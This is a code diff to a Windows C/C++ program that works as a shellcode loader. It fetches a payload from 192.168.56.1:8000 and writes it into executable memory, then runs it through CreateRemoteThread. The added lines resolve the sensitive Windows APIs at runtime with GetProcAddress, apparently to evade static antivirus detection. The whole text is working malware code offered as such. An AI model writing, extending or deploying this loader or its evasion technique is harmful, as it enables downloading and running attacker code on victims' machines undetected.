@@ -16,6 +16,13 @@ BOOL netXfer(const char* h, int p, Payload* pl);
 void xorObf(BYTE* d, DWORD l, BYTE k);
 DWORD execLocal(Payload pl);
 
+typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL(WINAPI* pGetExitCodeThread)(HANDLE, LPDWORD);
+typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
+
 int main() {
     Payload pl;
     if (!netXfer("192.168.56.1", 8000, &pl)) return 2;
@@ -67,26 +74,36 @@ BOOL netXfer(const char* h, int p, Payload* pl) {
 }
 
 DWORD execLocal(Payload pl) {
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    if (!hK32) return -99;
+
+    pVirtualAllocEx VirtualAllocEx_ = (pVirtualAllocEx)GetProcAddress(hK32, "VirtualAllocEx");
+    pWriteProcessMemory WriteProcessMemory_ = (pWriteProcessMemory)GetProcAddress(hK32, "WriteProcessMemory");
+    pCreateRemoteThread CreateRemoteThread_ = (pCreateRemoteThread)GetProcAddress(hK32, "CreateRemoteThread");
+    pWaitForSingleObject WaitForSingleObject_ = (pWaitForSingleObject)GetProcAddress(hK32, "WaitForSingleObject");
+    pGetExitCodeThread GetExitCodeThread_ = (pGetExitCodeThread)GetProcAddress(hK32, "GetExitCodeThread");
+    pCloseHandle CloseHandle_ = (pCloseHandle)GetProcAddress(hK32, "CloseHandle");
+
     HANDLE hp = GetCurrentProcess();
-    LPVOID m = VirtualAllocEx(hp, nullptr, pl.s, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID m = VirtualAllocEx_(hp, nullptr, pl.s, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!m) return -1;
 
     SIZE_T wr;
-    if (!WriteProcessMemory(hp, m, pl.d, pl.s, &wr)) {
+    if (!WriteProcessMemory_(hp, m, pl.d, pl.s, &wr)) {
         VirtualFreeEx(hp, m, 0, MEM_RELEASE);
         return -2;
     }
 
-    HANDLE ht = CreateRemoteThread(hp, nullptr, 0, (LPTHREAD_START_ROUTINE)m, nullptr, 0, nullptr);
+    HANDLE ht = CreateRemoteThread_(hp, nullptr, 0, (LPTHREAD_START_ROUTINE)m, nullptr, 0, nullptr);
     if (!ht) {
         VirtualFreeEx(hp, m, 0, MEM_RELEASE);
         return -3;
     }
 
-    WaitForSingleObject(ht, INFINITE);
+    WaitForSingleObject_(ht, INFINITE);
     DWORD ec;
-    GetExitCodeThread(ht, &ec);
-    CloseHandle(ht);
+    GetExitCodeThread_(ht, &ec);
+    CloseHandle_(ht);
     return ec;
 }
 
